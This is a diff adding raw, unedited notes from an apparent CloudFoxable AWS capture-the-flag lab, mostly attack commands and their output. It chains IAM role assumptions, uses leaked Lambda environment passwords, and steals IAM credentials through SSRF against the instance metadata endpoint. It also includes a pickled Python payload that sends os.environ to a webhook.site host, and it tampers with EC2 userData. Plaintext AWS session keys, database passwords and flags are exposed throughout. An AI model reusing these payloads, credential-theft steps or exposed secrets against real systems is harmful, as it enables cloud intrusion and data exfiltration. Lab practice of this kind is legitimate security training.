@@ -1,0 +1,349 @@
+{
+            "Path": "/",
+            "RoleName": "Kent",
+            "RoleId": "AROARN6E7ZG7M5W5LONRJ",
+            "Arn": "arn:aws:iam::098660501950:role/Kent",
+            "CreateDate": "2023-08-30T18:19:38+00:00",
+            "AssumeRolePolicyDocument": {
+                "Version": "2012-10-17",
+                "Statement": [
+                    {
+                        "Effect": "Allow",
+                        "Principal": {
+                            "AWS": "arn:aws:iam::098660501950:user/ctf-starting-user"
+                        },
+                        "Action": "sts:AssumeRole"
+                    }
+                ]
+            },
+            "MaxSessionDuration": 3600
+        },
+
+ 
+ {
+    "Credentials": {
+        "AccessKeyId": "ASIARN6E7ZG7O7U7GNEC",
+        "SecretAccessKey": "BeMtKcOhLalxhZXebaHiq+CWYsMdTgrQWxbCorjv",
+        "SessionToken": "IQoJb3JpZ2luX2VjEBQaCXVzLXdlc3QtMiJGMEQCIA7U5S2E+1phsZj5DqxvGiPUgCvE2aIHehK8w86j6E55AiAnanfq1pdKY1Pgv7ZHCeZhdXfUQHY/OVytzUhhgGu3TyqaAgjd//////////8BEAAaDDA5ODY2MDUwMTk1MCIMVVxG72yWNIIPFfkRKu4BAfCkUchHO4RJwNozFb5Mu+d4jUKzffiBMdieSeT40qjan+jYCQkf824fOueteLsip4rbHzkPLqZ+jJvMOKhKNtdRBLZtJIzdHX9tlAYNNkUHByyhLosbg2/MOUOpCnKjvwta892ihiJCBqig4tCUDpbaZTDVF1DNXNgw3OpMw1bTi2ozgFxE9zPoFqq8dVQaxeqQAGiSqI53cWVbJqqkczmZo61v70QGN7fLzs5/jO8zOKfYr0CihKEShMmc72p/Oa5JwyzVFDkpwRPFI+BHdDKHiqBCbxmoMG+prRyC7osSUkUymUaftxUhB7staDCW48OnBjqeAQhuSoNYQXksdQLPkN0ZTmCJQu/cH3aFY+YG3ctiBwnREVS+6pGdj+xEeIaJBA0TM19M/V5dMU3j++NGCGtdi+iSfnfPnEBAS+W/Z/A/iv5GqoJypf9goD+t8Kh2qroBICCq/e0fOpVyqaUCQHW/9wZPAD9xK7vNeVE5RAmm+alean/B/j/by71MM2quHJx66u5VFvIBiXAFXWSpfEow",
+        "Expiration": "2023-08-31T21:01:26+00:00"
+    },
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROARN6E7ZG7M5W5LONRJ:test",
+        "Arn": "arn:aws:sts::098660501950:assumed-role/Kent/test"
+ 
+ │ Role │ Lasso                                                            │ Managed │ important-policy                                                 │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/production/CICD/root                          │ No        │
+
+{
+            "Path": "/",
+            "RoleName": "Lasso",
+            "RoleId": "AROARN6E7ZG7IL65D7LXU",
+            "Arn": "arn:aws:iam::098660501950:role/Lasso",
+            "CreateDate": "2023-08-30T18:19:37+00:00",
+            "AssumeRolePolicyDocument": {
+                "Version": "2012-10-17",
+                "Statement": [
+                    {
+                        "Sid": "",
+                        "Effect": "Allow",
+                        "Principal": {
+                            "AWS": "arn:aws:iam::098660501950:role/Beard"
+                        },
+                        "Action": "sts:AssumeRole"
+                    }
+                ]
+            },
+            "MaxSessionDuration": 3600
+        }
+        
+        
+        {
+            "Path": "/",
+            "RoleName": "Beard",
+            "RoleId": "AROARN6E7ZG7AVT264KV3",
+            "Arn": "arn:aws:iam::098660501950:role/Beard",
+            "CreateDate": "2023-08-30T18:19:31+00:00",
+            "AssumeRolePolicyDocument": {
+                "Version": "2012-10-17",
+                "Statement": [
+                    {
+                        "Sid": "",
+                        "Effect": "Allow",
+                        "Principal": {
+                            "AWS": "arn:aws:iam::098660501950:root"
+                        },
+                        "Action": "sts:AssumeRole"
+                    }
+                ]
+            },
+            "MaxSessionDuration": 3600
+        }
+        
+        
+aws sts assume-role --role-arn arn:aws:iam::098660501950:role/Beard --role-session-name MySession --profile kent         
+
+{
+    "Credentials": {
+        "AccessKeyId": "ASIARN6E7ZG7LK4TU7YF",
+        "SecretAccessKey": "ZTHkBiYcIAQgyUzhgYGyBo0BPhnacJfWExLLq8Rc",
+        "SessionToken": "FwoGZXIvYXdzECgaDFJ78nuMFb+peiEyhiKtAU9Pj1eLyrjk0glgo3bOFMaia4Mh8RxSZm2Vr61G0bqmF0Vt10b2VMbMdIse59rUHpqHVrlDLa0ZHF+uTqvjncS7fdH6DZdI2ayiO4qE2vw3YtPGqH6UYlBSJOUfQ2613nt2/GvqNeqZDv4JGo1H+1ruck42QcebXOFp8EhyfaQ23CLD3VYHpbpg8zE1zVXafs/PahTNwlZQFWrAF3rzBukvxRj1a53wDrtr9MSsKPSmxKcGMi0ZZRPmy5INT6FI+w/pDYFihwhmMC+OeTKxlTsptco8ugEVhBk7CzZtkHvCz+E=",
+        "Expiration": "2023-08-31T23:25:56+00:00"
+    },
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROARN6E7ZG7AVT264KV3:MySession",
+        "Arn": "arn:aws:sts::098660501950:assumed-role/Beard/MySession"
+    }
+}
+
+
+aws sts assume-role --role-arn "arn:aws:iam::098660501950:role/Lasso" --role-session-name test --profile Beard  
+{
+    "Credentials": {
+        "AccessKeyId": "ASIARN6E7ZG7HCJGKUPF",
+        "SecretAccessKey": "58v6cz0ZA3TdednTCtSPElc9ohhmj7GcuWW+4UmR",
+        "SessionToken": "FwoGZXIvYXdzECgaDBU4PbCwQxbk3YW6ACKoAaEq6Q/NK96lXTz1fm9IkOlBiiEnJ1XVwhyFXPcoYOgusQQ1aR8cu24wQHWcWy0wf7uPo1x9AMeSGDC9U40PtBrhDWVZBFPIWc50kvqxwf4Rg/cOquDoKo3NS2QaGuzuoz5xyjMh6+972DMTwt24wgv1ZAb+YBrYm0wqOvJ7PcUG1B1mcxXoh8CXKicTqCgu9ico410Rn/nBWO+wDJNvU1fQZbTcStgTwyiqqsSnBjIt5yxX2nDJP3jdY9NyvsiPRj8GQCbdbOFXrRNC9EOT2L7S1vBhJzC9+WSqKGXl",
+        "Expiration": "2023-08-31T23:33:14+00:00"
+    },
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROARN6E7ZG7IL65D7LXU:test",
+        "Arn": "arn:aws:sts::098660501950:assumed-role/Lasso/test"
+    }
+}
+
+cloudfox aws permissions -p cloudfoxable -v2 | grep "ssm:GetParameter" 
+│ Role │ AWSServiceRoleForAutoScaling                                     │ Managed │ AutoScalingServiceRolePolicy                                     │ Allow  │ ssm:GetParameters                                                   │ *                                                                                          │ No        │
+│ Role │ eksctl-k8s-goat-cluster-nodegroup-NodeInstanceRole-1LZ7NW7APBC5U │ Managed │ AmazonSSMManagedInstanceCore                                     │ Allow  │ ssm:GetParameter                                                    │ *                                                                                          │ No        │
+│ Role │ eksctl-k8s-goat-cluster-nodegroup-NodeInstanceRole-1LZ7NW7APBC5U │ Managed │ AmazonSSMManagedInstanceCore                                     │ Allow  │ ssm:GetParameters                                                   │ *                                                                                          │ No        │
+│ Role │ Ertz                                                             │ Managed │ its-another-secret-policy                                        │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/cloudfoxable/flag/its-another-secret          │ No        │
+│ Role │ Lasso                                                            │ Managed │ important-policy                                                 │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/production/CICD/root                          │ No        │
+│ Role │ ream                                                             │ Managed │ executioner-secret-policy                                        │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/cloudfoxable/flag/executioner                 │ No        │
+│ Role │ swanson                                                          │ Managed │ lambda-sqs-secret-policy                                         │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/cloudfoxable/flag/lambda-sqs                  │ No        │
+│ User │ ctf-starting-user                                                │ Managed │ its-a-secret-policy                                              │ Allow  │ ssm:GetParameter                                                    │ arn:aws:ssm:us-west-2:098660501950:parameter/cloudfoxable/flag/its-a-secret                │ No  
+
+
+aws ssm get-parameter --profile Lasso --name "/production/CICD/root" --region us-west-2 --with-decryption
+{
+    "Parameter": {
+        "Name": "/production/CICD/root",
+        "Type": "SecureString",
+        "Value": "FLAG{root::ExploitingRoleTrustsIsFun}",
+        "Version": 1,
+        "LastModifiedDate": "2023-08-30T13:19:26.834000-05:00",
+        "ARN": "arn:aws:ssm:us-west-2:098660501950:parameter/production/CICD/root",
+        "DataType": "text"
+    }
+}
+
+
+"FunctionName": "auth-me",
+            "FunctionArn": "arn:aws:lambda:us-west-2:098660501950:function:auth-me",
+            "Runtime": "nodejs18.x",
+            "Role": "arn:aws:iam::098660501950:role/sauerbrunn",
+            "Handler": "index.handler",
+            "CodeSize": 1200,
+            "Description": "",
+            "Timeout": 3,
+            "MemorySize": 128,
+            "LastModified": "2023-08-30T18:19:52.255+0000",
+            "CodeSha256": "wDRiJlLRD3jaTUoM+63AZ+lX2qxs4Bm5SZzS0+Evb0E=",
+            "Version": "$LATEST",
+            "Environment": {
+                "Variables": {
+                    "lambda_http_user": "admin",
+                    "lambda_http_password": "NotSummer2023"
+
+
+aws lambda get-function-url-config --function-name auth-me --region us-west-2
+{
+    "FunctionUrl": "https://km7clfasv2rvxuty673ebopas40aznxl.lambda-url.us-west-2.on.aws/",
+    "FunctionArn": "arn:aws:lambda:us-west-2:098660501950:function:auth-me",
+    "AuthType": "NONE",
+    "CreationTime": "2023-08-30T18:19:52.168974Z",
+    "LastModifiedTime": "2023-08-30T18:19:52.168974Z"
+}
+
+
+
+
+https://km7clfasv2rvxuty673ebopas40aznxl.lambda-url.us-west-2.on.aws/?username=admin&password=NotSummer2023
+FLAG{furls2::WhoCanExploitTheThingYouFound:PLACEHOLDER}
+
+cloudfox aws permissions -p cloudfoxable -v2 | grep "lambda:ListFunctions"
+FLAG{furls2::WhoCanExploitTheThingYouFound:mewis}
+
+└─$ cloudfox aws resource-trusts -c -p cloudfoxable -v2 --outdir . 
+
+│ arn:aws:sns:us-west-2:098660501950:public                  │ Yes    │ Yes         │ * can sns:Publish                                                                                        │
+
+cloudfox aws sns -c -p cloudfoxable -v2
+
+aws --profile cloudfoxable --region us-west-2 sns subscribe --topic-arn arn:aws:sns:us-west-2:098660501950:eventbridge-sns --protocol https --notification-endpoint https://webhook.site/24eb6232-ccec-4dcd-a0bb-ebf41ffa98b6
+{
+    "SubscriptionArn": "pending confirmation"
+}
+
+
+aws --region us-west-2 sns confirm-subscription --token "2336412f37fb687f5d51e6e2425c464dec3a54d284c871d6c0317c62aaf73fd523674a8f5b246750f36a7836e3f916ae04cf81d6c34a7cf1122e4ffc1497a124284a6594fbdd2d6f48a74895e5cb12643b092f9e232d59384d81dd8b2c7521aab75762cb311f9f464ca02b72a6b5cd8bf0cd372c6f004784720d347d5299f12e" --topic-arn arn:aws:sns:us-west-2:098660501950:eventbridge-sns                   
+{
+    "SubscriptionArn": "arn:aws:sns:us-west-2:098660501950:eventbridge-sns:7a43bd6c-dc02-42b0-b013-6cce2a041971"
+}
+
+cloudfox aws endpoints -p cloudfoxable -v2 --outdir .
+
+echo $githubtoken | gh auth login --with-token
+gh auth status
+gh repo list
+gh repo clone cloudfoxable/super-secret-ML-stuff # login with un: cloudfoxable and pw as the PAT
+cd super-secret-ML-stuff && cat main.go
+
+cloudfox aws -p cloudfoxable instances -v2 --outdir . 
+
+│ bastion                           │ i-06f286b0ddda455a7 │ us-west-2a │ running │ 34.219.133.59 │ 10.0.1.234     │ arn:aws:iam::098660501950:role/reyna                                                            │ No           │
+
+cloudfox aws permissions --principal reyna -p cloudfoxable -v2
+
+aws --profile cloudfoxable --region us-west-2 ssm start-session --target i-06f286b0ddda455a7
+
+aws s3 cp s3://cloudfoxable-bastion-74ewb/flag.txt -
+
+#Variable
+
+cloudfox aws elastic-network-interfaces -p cloudfoxable -v2
+
+cloudfox aws databases -p cloudfoxable -v2
+
+cloudfox aws env-vars -p cloudfoxable -v2
+
+Lambda  │ us-west-2 │ rds-sql-executor │ RDS_USER              │ admin                                                                 │
+│ Lambda  │ us-west-2 │ rds-sql-executor │ RDS_DB_NAME           │ cloudfox7sn5z                                                         │
+│ Lambda  │ us-west-2 │ rds-sql-executor │ RDS_HOST              │ cloudfox-rds-7sn5z.cexwadcptj78.us-west-2.rds.amazonaws.com           │
+│ Lambda  │ us-west-2 │ rds-sql-executor │ RDS_PASSWORD          │ $A#=ci#WZgd8ovNe^L{6Vh{6<V#o%Zv          
+  
+
+mysql -u admin -h cloudfox-rds-uxb92.cexwadcptj78.us-west-2.rds.amazonaws.com -D cloudfoxuxb92 -p
+7*{6FX$!<L+5ibHW]#4-StVL0t=CadV
+
+cloudfoxable aws principals -p cloudfoxable -v2
+cloudfoxable aws role-trusts -p cloudfoxable -v2
+
+├──────────┼──────────────────┼────────────────────────────────────┼──────────┤
+│ t_rodman │ GitHub Actions   │ repo:galileotester/cloudfoxables:* │ No       │
+╰──────────┴──────────────────┴────────────────────────────────────┴──────────╯
+
+
+cloudfox aws -p cloudfoxable permissions -v2 --principal t_rodman
+
+│ Role │ t_rodman │ Managed │ trust-me    │ Allow  │ ssm:GetParameter │ arn:aws:ssm:us-west-2:098660501950:parameter/trust-* │ No        │
+
+
+curl http://10.0.1.36:12380/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/wyatt
+
+aws dynamodb scan --table-name wyatt-table --region us-west-2 --profile wyatt
+
+# retrieved logs via aws command
+
+└─$ aws logs describe-log-groups --region us-west-2 --profile cloudfoxable
+
+└─$ aws logs describe-log-streams --log-group-name /aws/lambda/executioner --region us-west-2 --profile cloudfoxable
+
+-> need to log in to the account and check the cloudwatch log to get the ream key.
+
+└─$ aws ssm get-parameter --with-decryption --name /cloudfoxable/flag/executioner --region us-west-2 --profile realm
+FLAG{theTopicIsExecution::WeJustPoppedALambdaByInjectingAnEvilSNSmessage}
+
+cloudfox aws permissions --principal pepi -p cloudfoxable -v2
+cloudfox aws lambdas -p cloudfoxable -v2
+└─$ aws lambda get-function --function-name producer --profile pepi --region us-west-2
+
+"Configuration": {
+        "FunctionName": "producer",
+        "FunctionArn": "arn:aws:lambda:us-west-2:098660501950:function:producer",
+        "Runtime": "python3.10",
+        "Role": "arn:aws:iam::098660501950:role/producer",
+        "Handler": "lambda_function.lambda_handler",
+        "CodeSize": 531,
+        "Description": "",
+        "Timeout": 3,
+        "MemorySize": 128,
+        "LastModified": "2023-09-01T23:51:54.162+0000",
+        "CodeSha256": "u6IgTyCupIgkJDn5OmtBlh6xVVRh+/x810k7XWcGK5U=",
+        "Version": "$LATEST",
+        "Environment": {
+            "Variables": {
+                "TARGET_SQS_QUEUE_NAME": "https://sqs.us-west-2.amazonaws.com/098660501950/internal_message_bus"
+            }
+        }
+
+aws lambda list-event-source-mappings --profile cloudfoxable --region us-west-2
+
+{
+    "EventSourceMappings": [
+        {
+            "UUID": "a0a49280-a23b-4ff8-8d96-5ddfa06d30a4",
+            "BatchSize": 1,
+            "MaximumBatchingWindowInSeconds": 0,
+            "EventSourceArn": "arn:aws:sqs:us-west-2:098660501950:internal_message_bus",
+            "FunctionArn": "arn:aws:lambda:us-west-2:098660501950:function:consumer",
+            "LastModified": "2023-09-01T18:52:10.160000-05:00",
+            "State": "Enabled",
+            "StateTransitionReason": "USER_INITIATED",
+            "FunctionResponseTypes": []
+        }
+    ]
+}
+
+
+cloudfox aws resource-trusts -p cloudfoxable -v2
+cloudfox aws sqs -p cloudfoxable -v2
+cloudfox aws env-vars -p cloudfoxable -v2
+cloudfox aws permissions --principal swanson -p cloudfoxable -v2
+
+╭──────┬─────────┬─────────┬──────────────────────────┬────────┬──────────────────────────────────┬───────────────────────────────────────────────────────────────────────────┬───────────╮
+│ Type │  Name   │ Policy  │       Policy Name        │ Effect │              Action              │                                 Resource                                  │ Condition │
+├──────┼─────────┼─────────┼──────────────────────────┼────────┼──────────────────────────────────┼───────────────────────────────────────────────────────────────────────────┼───────────┤
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ ssm:GetParameter                 │ arn:aws:ssm:us-west-2:098660501950:parameter/cloudfoxable/flag/lambda-sqs │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:ReceiveMessage               │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:DeleteMessage                │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:GetQueueUrl                  │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:GetQueueAttributes           │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:ChangeMessageVisibility      │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:ChangeMessageVisibilityBatch │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ sqs:DeleteMessageBatch           │ arn:aws:sqs:us-west-2:098660501950:internal_message_bus                   │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ logs:CreateLogGroup              │ *                                                                         │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ logs:CreateLogStream             │ *                                                                         │ No        │
+│ Role │ swanson │ Managed │ lambda-sqs-secret-policy │ Allow  │ logs:PutLogEvents                │ *                                                                         │ No        │
+╰──────┴─────────┴─────────┴──────────────────────────┴────────┴──────────────────────────────────┴───────────────────────────────────────────────────────────────────────────┴───────────╯
+
+# create_pickled_command.py
+
+import base64
+import pickle
+
+command = """python3 -c 'import http.client; conn = http.client.HTTPConnection("webhook.site"); import os; import base64; import json; data = json.dumps({"content":base64.b64encode(str(os.environ).encode()).decode("utf-8")}); headers = {"Content-type":"application/json"}; conn.request("POST","/153367ce-b1a4-4e1f-8384-179935101291",data,headers);'"""
+pickled_command = pickle.dumps(command)
+encoded_pickled_command = base64.b64encode(pickled_command).decode('utf-8')
+print(encoded_pickled_command)
+
+
+cmd = python3 -c 'import http.client; conn = http.client.HTTPConnection("webhook.site"); import os; import base64; import json; data = json.dumps({"content":base64.b64encode(str(os.environ).encode()).decode("utf-8")}); headers = {"Content-type":"application/json"}; conn.request("POST","/153367ce-b1a4-4e1f-8384-179935101291",data,headers);
+
+aws ssm get-parameter --profile swanson --name "/cloudfoxable/flag/lambda-sqs" --region us-west-2 --with-decryption
+
+
+#double tap
+
+└─$ aws ec2 stop-instances --instance-id i-054adbff830cfb9e7 --region us-west-2 --profile ec2_privileged
+└─$ aws ec2 modify-instance-attribute --instance-id i-054adbff830cfb9e7 --attribute userData --value file://userdataencoded.txt --region us-west-2 --profile ec2_privileged
+└─$ aws ec2 start-instances --instance-id i-054adbff830cfb9e7 --region us-west-2 --profile ec2_privileged
+
+ssh-keygen -t ed25519 -b 2048 # save as ec2_key
+└─$ ssh -i ~/.ssh/id_ed25519 ec2-user@44.234.45.33
+
+in the ssh session,
+install curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/linux_64bit/session-manager-plugin.rpm" -o "session-manager-plugin.rpm"
+sudo yum install -y session-manager-plugin.rpm
+
+aws ssm start-session --target i-08c0254bd01b43b47 --region us-west-2
+
+aws --region us-west-2 secretsmanager get-secret-value --secret-id DT_flag
+
+
